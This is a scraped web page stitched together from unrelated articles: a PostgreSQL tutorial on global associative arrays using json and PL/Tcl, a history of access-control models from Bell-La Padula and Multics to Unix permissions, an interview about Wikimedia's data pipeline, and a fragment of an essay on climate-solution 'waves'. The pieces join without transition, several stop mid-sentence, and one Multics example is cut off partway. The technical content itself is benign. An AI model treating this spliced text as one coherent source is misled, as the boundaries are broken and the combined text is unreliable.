<p>Before getting to the workarounds, let us understand what is an associative array. In programming languages, an associative array may either be called a <strong>map</strong> or a <strong>dictionary</strong>. Associative array is a collection of (key, value) pairs where a key associates to a value. This association between a key and a value may be referred to as mapping. The key can either be of a text or a numeric type that can be mapped to any value type.&nbsp;</p>
<p><b>PostgreSQL Array type</b></p>
<p>PL/pgSQL in PostgreSQL allows us to declare a variable as an ARRAY type. This ARRAY can be either a <strong>base</strong> or a <strong>custom</strong> type. For example, if we want to store a list of <strong>PINCODE</strong> values, then, we can declare the variable as <strong>v_pincode INT[]</strong>. Once we declare this variable, then, we can load all the pincode values from a table/view/function into this array.&nbsp;</p>
<p>We can also initialize the <strong>v_pincode</strong> array type with a static set of pincode values. Here, the <strong>v_pincode</strong> holds all the values and we can fetch a specific state’s pincode value, by providing an index. Which means, if we want to access the 1st state pincode, then, we can access the value using <strong>v_pincode[1]</strong>. If we want to access the pincode value of 3rd state, then, we have to pass the index value 3 using <strong>v_pincode[3]</strong>.</p>
<p>Here is a sample code to illustrate the above with an example.</p>
<pre>postgres=&gt; CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode INT[]=ARRAY[123456, 123457, 123458, 123459];<br>BEGIN<br>RAISE NOTICE '1st state pincode %', v_pincode[1];<br>RAISE NOTICE '3rd state pincode %', v_pincode[3];<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;<br>CREATE FUNCTION</pre>
<p>Let us execute the function created above and see the results.</p>
<pre>postgres=&gt; SELECT process_orders();<br>NOTICE: 1st state pincode 123456<br>NOTICE: 3rd state pincode 123458<br>process_orders<br>----------------<br>t<br>(1 row)</pre>
<p>We got the results as expected. However, this code has some limitations because we are unable to fetch the values based on their keys. For example, the pincodes (1st and the 3rd elements) are fetched using their Indexes. If we are able to access the same pincodes based on their keys, then, the lookup will be more powerful. So, how to approach this requirement ? Let us discuss the approach further.&nbsp;</p>
<p><b>Associating or mapping a name or a key to a value</b></p>
<p>Thanks to PostgreSQL’s rich data types such as <strong>hstore</strong> or <strong>json</strong> which can be leveraged to perform such mapping.</p>
<p>Following is a sample code using a <strong>json</strong> static object.</p>
<pre>CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode JSON= '{"CA": 123456, "AZ": 123457, "OH": "123458", "CO": 123459}';<br>BEGIN<br>RAISE NOTICE 'CA state pincode %', v_pincode-&gt;&gt;'CA';<br>RAISE NOTICE 'OH state pincode %', v_pincode-&gt;&gt;'OH';<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;</pre>


<p>Let us execute the above created function and see the results.</p>

<pre><code>postgres=&gt; SELECT process_orders();
NOTICE:  CA state pincode 123456
NOTICE:  OH state pincode 123458
process_orders
----------------
t
(1 row)</code></pre>

<p>Now, we are able to make the lookup using a key possible with our PL/pgSQL code. Thus, by using a json type instead of an ARRAY we can implement the concept of associative arrays.&nbsp;</p>

<p><strong>Global Associative Arrays</strong></p>

<p>The json approach demonstrated above seems to be perfect, but it does not solve the problem of global or session level associative arrays. What this means is that the same associative array cannot be accessed using another function running in the same session. This is because of the lack of global variables or global arrays.&nbsp;</p>

<p><strong>How to make Global Associate Arrays possible with PostgreSQL ?</strong></p>

<p>Following are the 5 possible solutions with some or no limitations to each approach.&nbsp;</p>

<ol>
<li><strong>Declare the same json object in the other function.</strong></li>
</ol>

<ul>
<li>Requires duplicating the same variable and the same context.&nbsp;</li>
</ul>

<ol start="2">
<li><strong>Pass the json argument as a parameter to the other function.</strong></li>
</ol>

<ul>
<li>Pass the same value across functions. However, the argument lists may become huge to manage or debug.</li>
</ul>

<ol start="3">
<li><strong>Store this object in a table and load it in the function.</strong></li>
</ol>

<ul>
<li>Storing it in a Table and accessing the elements by selecting from the Table. This can be a heavy overhead.&nbsp;</li>
</ul>

<ol start="4">
<li><strong>Use set_config() approach, which set the object at a session level, and read it from the current_setting().&nbsp;</strong></li>
</ol>

<ul>
<li>If any value is set, an Exception block cannot view the configured settings. May become challenging while performing conversions from Oracle to PostgreSQL where a good amount of logic is written in the Exception block. May be great when we are not accessing any global variables in the exception block. We will be discussing this in detail in our future blog post.&nbsp;</li>
</ul>

<ol start="5">
<li><strong>Using a supported PostgreSQL language context.&nbsp;</strong></li>
</ol>

<ul>
<li>With this approach, we should be able to access the global variables across the exception blocks and also the non exception blocks.</li>
</ul>

<p>The first 4 approaches seem to be pretty straight forward and simple with their own limitations. But the last approach about using another language’s session context is something interesting and we are discussing that further.</p>

<p><strong>Using TCL to support Global Associative Arrays</strong></p>

<p>As we all know, PostgreSQL supports many trusted procedural languages such as PLPerl, PLPython, PLTCL, PLv8 etc. All these trusted languages guarantee that the program code written in that language will not be accessing the underlying physical files. Out of all these programming languages, we will be choosing a simple, safe and a powerful language called <span><a href="https://wiki.tcl-lang.org/page/pltcl">tickle (PLTCL)</a>.</span>&nbsp;</p>

<p>TCL language does support the associative array concepts and we will be leveraging this feature in a global way. This will give more flexibility of lookup of values using keys. Let us see the following example code to see how we can make the declaration of a global variable with tickle (TCL).</p>

<p><strong>TCL instructions<br></strong>As the first step, let’s declare a global variable (namespace) using the following TCL code.</p>

<pre><code>$ tclsh
% # Here, arr_ptr is a pointer to the namespace/global variable "pincodes"
% upvar 0 ::"pincodes" arr_ptr</code></pre>

<p>Now, let’s add a pincode value to this namespace (or the global variable).</p>

<pre><code>% set arr_ptr('CA') 123456
123456</code></pre>

<p>Let us now get the value which we set in the associative array.</p>

<pre><code>% set arr_ptr('CA')
123456</code></pre>

<p>Using the simple example created above, we have seen how we can declare a global variable and store the values using TCL.</p>

<p><strong>Using PLTCL to support Global Associative Arrays in PostgreSQL.</strong></p>

<p>To achieve the functionality of global associative arrays, let us embed the same code in PLTCL as seen in the following steps.</p>
<p><strong>Step 1 :</strong> Create the PLTCL Extension</p>

<pre><code>postgres=&gt; CREATE EXTENSION pltcl;
CREATE EXTENSION</code></pre>

<p><strong>Step 2 : </strong>Create a function using PLTCL to declare the Global Associative Array and set a value.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_set(TEXT, TEXT, TEXT) RETURNS VOID AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2) $3
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Step 3 : </strong>Create a function using PLTCL to get the value mapped to the key.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_get(TEXT, TEXT) RETURNS TEXT AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2)
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Testing</strong></p>

<p>Let us perform a test using the newly created PLTCL functions.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'CA', '123456');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_get('pincodes', 'CA');
pltcl_get
-----------
123456
(1 row)</code></pre>

<p>As seen in the above example, we are able to get data from the TCL context which is global. Which means, we are able to set the <strong>pincodes</strong> from one statement (using pltctl_set() ), and able to access it’s value from another statement (using pltcl_get()).&nbsp;</p>

<p><strong>Iterating over the Global Associative Arrays</strong></p>

<p>What is an array without an iterator, right? Let us leverage the same TCL code and create another function which iterates over the global array.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_itr(TEXT) RETURNS TABLE(key TEXT, value TEXT)
AS
$$
upvar 0 ::$1 arr_ptr
    foreach i  [array names arr_ptr] {
        return_next [list key $i value [set arr_ptr($i)]]
    }
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p>Now, let’s add a few more entries to `pincodes` global array and do the iteration test.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'AZ', '123457');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'OH', '123458');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'CO', '123459');
pltcl_set
-----------
(1 row)</code></pre>

<p>Let’s use the iterator function to get all the lists of available <strong>pincodes</strong> from the global array, as seen in the following block.</p>

<pre><code>postgres=&gt; SELECT * FROM pltcl_itr('pincodes');
key | value
-----+--------
CA  | 123456
CO  | 123459
OH  | 123458
AZ  | 123457
(4 rows)</code></pre>

<p>As seen above, this iterator is actually helping to iterate over the global associative array. We can use these values across multiple functions across the same session.&nbsp;</p>

<p><strong>Conclusion</strong></p>

<p>PostgreSQL offers a lot of flexibility in writing the code in multiple languages, which eventually enables us to inherit the power of other programming languages. As you have witnessed in this blog post, we leveraged the TCL’s features and are able to achieve the global associative arrays, which …</p></div></div></div></div></div></div></section></div>

<h2 id="evergreen-challenge">Evergreen Challenge</h2>

<p>Every cloud has its own identity and access management system. AWS and Google use a bunch
of JSON files specifying various rules. Open source projects like Kubernetes support
three concurrent access control models - attribute-based, role-based and
a webhook access control, all expressed using YAML. Some teams are going as far as
inventing their own programming language to solve this evergreen problem.</p>

<p>As many engineers before us, we faced the challenge of choosing the
design and the tooling from the kaleidoscope of JSON, YAML and custom languages
for our own software’s access controls. Which system is the best, and can there be one language to rule them all?
What are the properties of a good access control system, and what mistakes of the past should we avoid?</p>

<h2 id="time-sharing-and-first-pen-testers">Time Sharing and First Pen-testers</h2>

<p>In the early 1960s one computer could be accessed by one person, program and team at a time.
Computers were quite expensive; a PDP-1, for example, would cost you a whopping $120,000.
That’s close to $1M adjusted for inflation in 2021.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/pdp-1.jpg" width="100%" alt="PDP-1 in a computer history museum"></p>

<p><em>DEC PDP-1 in a computer history museum</em></p>

<p>You could securely use the computer for different applications as long as the files and data for
different projects were kept separate. That was a serious bottleneck, and by the mid-sixties manufacturers offered time-sharing systems
that allowed many folks to use computers at the same time.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/time-sharing.jpg" width="100%" alt="Fernando Corbató with MIT's IBM 7090"></p>

<p><em>Fernando Corbató - researcher working on time sharing with MIT’s IBM 7090</em></p>

<p>The arrival of time sharing made folks at the U.S. Air Force worried.
There could be two programs residing in the storage and sharing compute and memory at the same time.
What if a program working on a lower privilege level hacked the system and gained access to sensitive data of another program?</p>

<p>To assess the scope of the problem, USAF formed a special task force to
figure out the impact of such hacks and come up with a solution.
The team came back with some bad news: operating systems at the time were not designed
at all to protect from a malicious program. The executable had almost unrestricted
capability to reference any main and auxiliary memory locations.
The task force concluded that a new approach was needed [1]:</p>

<blockquote>
<p>The operating systems were not designed to be secure, provide a malicious user
with any number of opportunities to subvert the operating system itself.</p>

<p>…</p>

<p>A system designed to be secure, containing;</p>

<p>A) An adequate system access control mechanism</p>

<p>B) An authorization mechanism</p>

<p>…</p>
</blockquote>

<h2 id="bell-la-padula-security-model">Bell-La Padula Security Model</h2>

<p>In 1972, two computer scientists were assigned with the task of designing such a system [2].</p>

<blockquote>
<p>In the summer of 1972, The MITRE Corporation initiated its task to produce a report titled “Secure Computer Systems.”
The modeling task fell to Len La Padula and me. David E Bell.</p>
</blockquote>

<p>In 1972-1974 David E. Bell and Leonard J. La Padula came up with the theoretical foundations of access control systems [3]
and then worked with programmers to implement that in the most promising O.S. at the time — Multics [4].
In the Multics paper, they defined elements of both models still used to this day — subjects,
objects and access control lists.</p>

<ul>
<li><code>subjects</code> are actors, like processes and programs in execution.</li>
<li><code>objects</code> are passive things, like data, files, programs, subjects.</li>
</ul>

<p><img src="https://goteleport.com/blog/images/2021/access/subjects-objects.png" width="100%" alt="Subjects accessing objects"></p>

<p><em>Subjects accessing objects. Here and below are the original figures from the paper.</em></p>

<p>Subjects can access objects. These access modes are governed by access <code>attributes</code>:</p>

<ul>
<li><code>e</code> - no access, <code>r</code> - read-only, <code>a</code> - can write, but not read, <code>w</code> - can read and write.</li>
</ul>

<p>They defined access of subject to object with a triple:</p>
<pre><code>(subject, object, attribute)</code></pre>
<p>Objects are organized in a tree-like structure, forming a hierarchy.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/object-structure.png" width="100%" alt="Object structure"></p>

<p><em>Object structure</em></p>

<p>An access matrix specifies access modes (<code>e</code>, <code>r</code>, <code>a</code>, <code>w</code>) in which subjects can access objects.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/access-matrix.png" width="100%" alt="Access Matrix"></p>

<p>Because MITRE corporation’s research was funded by the military, you would find a couple of parts unfamiliar to
most Unix users — category and classification levels for the U.S. Military — “unclassified”, “confidential”, “secret”, “top secret”.
Categories are general topics such as “Nuclear”, “NATO” or “Crypto”.</p>

<p>Security level assigned to an individual and object is a pair:</p>
<pre><code>(classification, set of categories)</code></pre>
<p>A user can access a document if their security level “dominates” the document level:</p>
<pre><code>(class 1, category-set 1) dominates (class 2, category-set 2) if and only if

class 1&gt;= class 2 and category-set 1 includes category-set 2 as a subset</code></pre>
<p><strong>Simple Security Property</strong></p>

<p>The researchers have defined a first property, as a simple security property:</p>

<p>For a triplet <code>(subject, object, read)</code> the security level of a subject always “dominates” security level of an object.
In other words, subjects can only read objects with the same or lower security level.
This property is also sometimes called “Read down” or “ss-property”.</p>

<p><strong>Star Property</strong></p>

<p>Bell and La Padula noticed that “simple security property” is not enough to protect classified
information. A malicious program could pass classified information along by reading the classified
docs on one level and writing on lower level:</p>

<p><img src="https://goteleport.com/blog/images/2021/access/star-property.png" width="100%" alt="Star property"></p>

<p>They called it “*-property”:</p>

<blockquote>
<p>in any state, if a subject has simultaneous “observe” access to object-1 and “alter”
access to object-2, then level (object-1) is dominated by level (object-2)</p>
</blockquote>

<p>In other words, you cannot read objects at higher security level and write
to objects at lower security level. Some folks call this property “Write Up”.
With this rule in place, any system drifts towards higher and higher clearance level
documents and it creates a practical problem — what if you still need to communicate the
level “down”? They defined “trusted subjects”, exceptions to the “*-property”
rule to communicate some information down and lower clearance of the documents.</p>

<p><strong>Discretionary and Mandatory</strong></p>

<p>To conform to military regulations, the researchers defined a “mandatory” or “non-discretionary” security policy —
an individual may not exercise their judgment to violate access standard, and the enforcement
is mandatory.</p>

<p>Two systems have emerged: Mandatory Access Controls (MAC), in which individuals
have no say in whether to set up their access levels, and Discretionary Access Control (DAC), in which folks
have some say who can access what.</p>

<p>Discretionary security is defined by access matrix above and specified as “ds-property”:</p>

<blockquote>
<p>if (subject-i, object-j, attribute-x) is a current access … then attribute-x is recorded
in the (subject-i, object-j) component of M …</p>
</blockquote>

<p>In other words, subjects can access objects if there is a matching access attribute
in the matrix.</p>

<p><strong>Basic Security Theorem</strong></p>

<p>Bell and La Padula defined “Basic security theorem” as a combination of
“ss-property”, “*-property” and “ds-property’.</p>

<p>In their assessment, the system is secure if:</p>

<ul>
<li>Users can only read resources at lower or equal security levels (Read Down)</li>
<li>Subjects cannot read objects at higher level and write to objects at lower level (Write Up)</li>
<li>System enforces access attributes on any subject-object access.</li>
</ul>

<p>The researchers were excited about “inductive nature” of the Basic Security Theorem — the system
will stay secure through all transitions as long as these three rules are enforced.</p>

<p>In the security world, this is also called security invariant — a property that system
keeps true at all times despite all the changes.</p>

<p><strong>Multics</strong></p>

<p><img src="https://goteleport.com/blog/images/2021/access/multics.jpg" width="100%" alt="Visicalc on Multics"></p>

<p><em>Visicalc running on Multics</em></p>

<p>Based on this paper, Multics engineers introduced access control lists — <code>ACL</code>.
Multics “ACLs” were composed of <code>(process, ring bracket)</code> pairs, where process is analogue of
the paper’s subject and ring bracket is a clearance level.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/acls.png" width="100%" alt="Multics ACLs"></p>

<p><em>Multics ACLs. Multics Paper</em></p>

<p>Objects could be “directory segments”, data segments, certain I/O devices, certain
address spaces and sockets.</p>

<p>Multics stored ACLs in the parent directory of an object and manipulated them
by altering the directory properties. Control over an object was represented
by write permission on an object’s directory.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/segment.png" width="100%" alt="Adding Segment to DIR"></p>

<p><em>Adding Segment to DIR. Multics Paper</em></p>

<p>A request to give access to an object is allowed only if the requesting subject
has current <code>w</code> access to the parent of the object.</p>

<p>Imagine a situation when a user created unclassified folder <code>Or</code>, then in it,

<p>An unclassified user can’t access the file <code>O2</code> because they can’t access the secret folder <code>O1</code>.
This would have violated the ss-property — because unclassified users can’t read the
secret data and *-property, where users can’t read secret data and write to non-secret files
at the same time. They called it “The need for compatibility” — a child’s object
security levels should be higher than the parent’s object security levels.</p>

<p>Chances are, you are using discretionary access control implementation of the Bell-La-Padula
model every time you access a file on your system.</p>

<p><strong>Discretionary Access Controls</strong></p>

<p>Unix devs were frustrated with Multics’ complexity. Even Unix itself is a pun on Multics —
“Uniplex information and computing service”,  compared to Multics’  “Multiplex information and computer services”.
They dropped most of the complex stuff and kept only the discretionary part securing access to files with permissions.</p>

<p><em>Ken Thompson and Dennis Ritchie hacking on PDP-11 and probably ranting about Multics complexity</em></p>

<p>DAC defines an owner of a resource, for example a file. A file owner specifies what others
can do to this file. Linux access control list system defines a set of permissions - read <code>(r)</code>, write <code>(w)</code> and execute <code>(x)</code>.
Users are divided into three classes: owners, groups and other. Every Linux file has a list of
access controls defined for every user class. Here is, for example an ACL for a file “animals.pl” on my computer:</p>
<div><pre><code data-lang="bash">$ ls -l animals.pl
-rw-r--r-- <span>1</span> sasha admins <span>187</span> Nov <span>28</span> 15:14 animals.pl</code></pre></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h6>What is the company about? What are you building?</h6><p>The data engineering team at Wikimedia maintains what would be a traditional data pipeline for product teams to gather data to aid in product execution. What is different in the open knowledge ecosystem is that much of the metadata about Wikipedia is also public. This means that you can get a <a href="https://dumps.wikimedia.org/">myriad of datasets</a> with <a href="http://stats.wikimedia.org/">pageviews for every article</a>, unique devices, editors per country, etc.<br></p><p>All this data is delivered every hour and has been so for more than 15 years. It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP. Maintaining all the pipelines for data delivery for a system that <a href="https://grafana.wikimedia.org/d/000000500/varnish-caching?viewPanel=5&amp;orgId=1&amp;refresh=15m">at peak gets 200,000 requests </a>per second is needless to say, quite a task.&nbsp;&nbsp;</p><p>‍</p><blockquote>It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP<br></blockquote><h6>Can you describe the high level data architecture? Wikipedia is pretty open and I know you use Cassandra, Druid, Kafka, how those work together. In other words, what’s the data path from a GET request to a wikipedia page to something you can render on a graph.</h6><p>Something that is not well-known is that the whole puppet repo that describes Wikipedia's is public and you can take a look at it on<a href="https://github.com/wikimedia/puppet"> github</a>. To this day I find this impressive, that every single piece of infra of all Wikipedia's systems is described there. We also provide <a href="https://meta.wikimedia.org/wiki/Wikimedia_servers#/media/File:Wikipedia_webrequest_flow_2020.png">pretty pictures of the stack.</a><br></p><p>The data stack is very standard. As you mentioned we have Kafka for data intake, Hadoop as a persistent storage and from those two data gets ingested into Cassandra or Druid. There are different pipelines with different bells and whistles, some of them have a JSON <a href="https://schema.wikimedia.org/#!/">schema registry</a> and some others parse data out of the HTTP requests directly.&nbsp; In Wikipedia, 97% of requests at all times are cached and thus served from the CDN via Varnish. So, in order to gather all this data, we need Varnish to be able to talk to Kafka, we have a custom piece called varnishkafka that is a source of joy (#not) for our SRE team. The migration to Apache Traffic Service will eventually render this piece of infra obsolete.&nbsp;<br></p><p>There are two distinct sources of data: data from <strong>readers </strong>and <strong>editors</strong>. While data for readers is very high volume is quite "simple". It can be thought as simple pageviews. Edit data is however a lot more complicated and in order to harvest it properly we developed a <a href="https://en.wikipedia.org/wiki/Lambda_architecture">Lambda-ish architecture</a>. We source this data two ways, once a month from the MediaWiki database directly and via Spark, after 2 days of processing in a ~60 nodes hadoop cluster we create large <a href="https://wikitech.wikimedia.org/wiki/Analytics/Data_Lake/Edits">denormalized tables</a>.&nbsp; And at the same time we have event streams of data that publish every edit event to wikipedia as a json blob real time and those also get persisted on hadoop. We made a very conscious decision to use <a href="https://techblog.wikimedia.org/2020/09/10/wikimedias-event-data-platform-or-json-is-ok-too/">JSON versus AVRO</a> in most of our data pipelines and, since then, the Kafka ecosystem has moved more towards being a lot more friendly towards JSON. Makes sense, because JSON is a lot easier to debug.&nbsp;<br></p><p>The visualization layer is Superset, a nifty UI tool that can be used against druid but also <a href="https://prestodb.io/">Presto</a>, a very fast data query engine developed by Facebook that can be deployed on top of hadoop and it is fully ANSI SQL compliant.</p><h6>Wikipedia does not use any cloud provider, how does that change the way architecture is designed?</h6><p>Everything is developed from the ground up so we favor open source solutions tried and tested at scale. Much of the data pipeline of Wikipedia exists thanks to Facebook and LinkedIn open source efforts.</p><p>‍<br></p><h6>Also, you only use open source software, how do you pick the right tool for the job? Are software licenses a limitation? Could you use Mongo or Elastic for example?</h6><p>If we need a piece of software that, for example, pulls data from Kafka we survey the ecosystem and look at what exists that is tried and tested and fully open source. We do couple small prototypes and evaluate results. See for example our recent spike on <a href="https://wikitech.wikimedia.org/wiki/Analytics/Systems/Cluster/Workflow_management_tools_study">Airflow and others</a>.&nbsp; Licenses that do not provide the same level of freedom as <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0</a> are a problem. We cannot, for example,&nbsp; use the licenses for Kafka Connect which are too restrictive. We <a href="https://diff.wikimedia.org/2014/01/06/wikimedia-moving-to-elasticsearch/">have been using Elastic since 2014</a> but that, with their new license, might need to change.&nbsp;</p><p>‍<br></p><h6>What are some of the hardest data problems you’ve had to solve so far?</h6><p>Something that I have learned in these 20 years of work is that most of the real hard problems have to do with people, rather than technology.</p><p>Now, I would say the hardest problems in the data realm on 2021 have to do with Privacy. At Wikipedia Privacy is paramount (there cannot be truly free access to knowledge without a guarantee of privacy) and we had to "invent" methods to calculate in privacy-conscious ways metrics that are the norm for web properties, like Monthly Active Users. You can see <a href="https://diff.wikimedia.org/2016/03/30/unique-devices-dataset/">how we did it.</a> Still, the hardest problem was probably communicating effectively how much we care about Privacy.</p><p>‍</p><h6>What are the hard ones still unsolved?</h6><p>Data quality issues are kind of a "<a href="https://en.wikipedia.org/wiki/Fractal">fractal</a>" problem, you are never done eliminating those completely. <a href="https://phabricator.wikimedia.org/T211833">Here</a> is an example of a problem with data quality that was invisible to data throughput alarms and here is the first idea we had on how to partially solve issues like these (spoiler: entropy counts). Now, these examples make apparent how other quality issues of more complex nature would slip by.&nbsp;</p><h6>How did the architecture change during your 6 years at wikipedia?</h6><p>I would say it is recently that streaming or event-based architectures&nbsp; have become an achievable reality, little by little we are moving towards a world with more <a href="https://diff.wikimedia.org/2017/03/20/eventstreams/">streaming services.</a>&nbsp;</p><h6>Tell us some interesting numbers (traffic, rows, gigabytes you store, process, infra costs and so on)</h6><p>Wikipedia's <a href="https://wikimediafoundation.org/about/financial-reports/">budget is public</a>, the site and the 400 people on staff plus a number of projects and chapters are run with a budget of about $100 million dollars per year. The whole data stack hardware costs are minimal, less than a million dollars per year for about 3PB of data. We process and aggregate a lot of data but also, according to our privacy policy, a lot of it is discarded.</p><h6>What’s the most interesting use case solved with data. I know you have <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">pretty interesting blog posts</a> about it.</h6><p>My two favorite projects are more data scienc-y than data engineer-y and in both I collaborated with our team of Researchers which are the ones that really came into gauge whether the engineering ideas are mathematically sound.<br></p><p><strong>Bot detection</strong>: It took us a bit but we finally were able to flag a lot of the automated traffic that Wikipedia gets and tag it as such on our data releases and internal reports. Some of this traffic is benign (in the sense of it only using resources). An <a href="https://phabricator.wikimedia.org/T273741">example</a>.&nbsp; Other traffic, however, is not so innocuous. There are many attempts to manipulate Wikipedia's top pageview lists, for example. Most recently someone was trying to add a bunch of obscene terms to the top pageview list of Hungarian Wikipedia.</p><p>While on first instance, this seems like a simple classification problem, getting a labeled dataset to do prediction is actually not that simple. It&nbsp; requires building pseudo-sessions on top of data that has no common identifiers to know that two requests came from the same entity. We ended up using heuristics rather than ML and things worked out pretty well. You can read about the details of it <a href="https://techblog.wikimedia.org/2020/10/05/bot-or-not-identifying-fake-traffic-on-wikipedia/">here</a>.<br></p><p><strong>Censorship Alarms: </strong>We wanted to identify events in which active censorship of Wikipedia sites is ongoing. Wikipedia was blocked in Turkey for years and it is today blocked in Mainland China. Besides these countries like Iran block Wikipedia on and off. Looking at that problem in detail we realized that it had a lot in common with problems with data quality so we used some of the same techniques to alarm when "it seemed" a country had an anomalous traffic pattern. Again, this is less easy than it seems at first sight because you do not want to alarm unnecessarily and uniform traffic drops do not constitute an event. Anomalous traffic drops do. See how we did it <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">here</a>.&nbsp;&nbsp;</p><p>‍<br></p><h6>What are the most interesting, unexpected, or challenging lessons that you have learned? I guess there are plenty of them related to user privacy. How that changes in comparison to a “regular company”, what things you need to be careful when dealing with data.</h6><p>Lessons learned are many: in environments where the work is principle-based rather than profit based defining metrics is not easy.&nbsp; When everyone cares a lot about the larger mission of their work there is going to be a lot of strong discussions, once consensus is reached execution is fast with zero management oversight. Also, principles are very useful when choices are needed so in a way, working on a strong principle based organization makes some choices easy (ex: only use open source, preserve the right to fork) even if those choices imply a lot of work.</p><h6>How was your team organized: people, roles. What was your objective as a team? I guess one of them would be to create internal tools but I know you have some external tools and data.</h6><p>The larger Technology team reports to the CTO, there are several parallel teams: Security, SRE, Data Engineering, Performance... Those teams work independently but coordinate among themselves.&nbsp;The mission of the Data Engineering team is to serve internal customers but also the large external community. I think for a team in an organization as large in impact as Wikimedia is crucial to have a mission statement, otherwise it is easy to get lost in the many (infinite, really) requests for work. Our mission was to "empower and support data informed decision making across the Foundation <strong>and</strong> the Community". We make Wikimedia related data available for querying and <strong>analysis</strong> to both Wikimedia employees and the different Wiki communities and stakeholders."<br>This mission, notice, involves serving a large group of stakeholders, the community of editors that do not …</p></div></div></div>

Graphic by Jonathan Foley © 2021.</figcaption></figure></div></div></div><div><p id="8ef1">As we look to halving emissions by ~2030 and reaching net-zero by ~2050, I like to think of <strong>climate solutions moving in “waves” along several parallel fronts</strong>. Each one of these “waves” needs to <em>begin</em> <em>today</em> — but they unfold differently and yield results over time.</p></div></section><section><div><div><p id="2105"><span>To</span> understand this, it is important to see that <strong>each family of climate solutions has a <em>characteristic timescale</em></strong><em> </em>associated with it. That is, climate solutions tend to cluster into different categories, each with its own sequencing and pace.</p><p id="f27b">For example, some actions can return <em>rapid</em> results, like radically improving energy efficiency, stopping deforestation, or capping methane leaks and black carbon emissions. Others make steady progress as we upgrade the world’s infrastructure — electrifying millions of buildings and vehicles and changing practices on millions of farms and ranches across the globe. Some others are naturally slower, like sequestering carbon by planting trees or regenerating soils, which build up over decades. And some solutions could be game-changers in the future but still require decades of research and development to come to fruition.</p></div></div></section><section><div><div><p id="04a3"><span>I</span> think <strong>we need <em>all</em> these solutions — pursued in parallel</strong>. The challenge is to <em>weave them together over time</em>, to make the most progress possible, decade by decade.</p><p id="5423">Below, I have organized climate solutions into <strong><em>four major waves of action</em></strong>, which I think can play out in different ways.</p></div></div></section><section><div><div><p id="4fc7">To dramatically cut emissions in the 2020s, we need aggressive and immediate action. Fortunately, there are solutions that can help with this.</p><p id="e636">Some “Quick Win” solutions focus on <strong>halting highly destructive practices, </strong>such as widespread deforestation, flaring and fugitive emissions of methane, and “black carbon” emissions from dirty cookstoves, biomass burning, and other sources. The moment we stop these practices, their emissions cease too. And reducing methane and “black carbon” emissions helps a great deal in the short term, as they pack a huge warming punch up front, while carbon dioxide warms more gradually. In other words, cutting methane and black carbon emissions now buys us time while we tackle other emissions.</p><p id="ce81">Other “Quick Win” solutions <strong>focus on efficiency and waste,</strong> which can also achieve rapid emissions reductions. There are <em>enormous</em> opportunities to be more efficient in electricity use (especially in buildings and industrial processes), industry (through better management of waste and materials, especially refrigerants), transportation (increased fuel efficiency and alternative transportation), and buildings (with weatherization, insulation, building automation, and preventing refrigerant leaks). And in the food sector, we should dramatically cut food waste (~30–40% of the world’s food is <em>never</em> eaten), which can also greatly lower emissions.</p><p id="6379">There are obstacles to implementing all of these solutions, of course, but they offer large and immediate emissions reductions, plus strong economic returns. They are among the lowest hanging fruits, and that’s what we need for immediate results.</p></div></div></section><section><div><div><p id="70e3">In addition to “Quick Wins”, we simultaneously need to start replacing old infrastructure with new, low-emitting systems.</p><p id="3278">To begin, we have to <strong>shut down fossil fuel energy sources</strong> and <strong>deploy renewable energy</strong> across the planet as quickly as possible. But given the enormous physical infrastructure and capital involved, this will inevitably take time. Even the most aggressive scenarios of this energy transition require the 2020s and 2030s to complete.</p><p id="51cb">Beyond phasing out fossil fuels and replacing them with renewables, we will simultaneously have to <strong>electrify everything</strong>. That means updating nearly every building on Earth so that heating and cooling systems are using renewable electricity. We will also have to retire nearly every vehicle on Earth, replacing them with electric bikes, cars, trucks, and trains.</p><p id="a686">And we will have to change <strong>almost every farm and ranch</strong> on Earth, transitioning them from highly-emitting farming techniques to low-emissions methods, including so-called regenerative practices.</p><p id="c5d6">We need to get started on all of these big transitions <em>today</em>, but given the massive infrastructure (and capital) turnover involved, this is going to take a concerted effort over two or three decades to accomplish. It reminds me of the old joke: <em>Question: What’s the best time to get started? Answer: 30 years ago. Question: What’s the second-best time to get started? Answer: Today.</em></p></div></div></section><section><div><div><p id="eadb">The only viable paths to address climate change require we eventually bring emissions to zero. But <strong>we can also create carbon sinks </strong>— especially <a 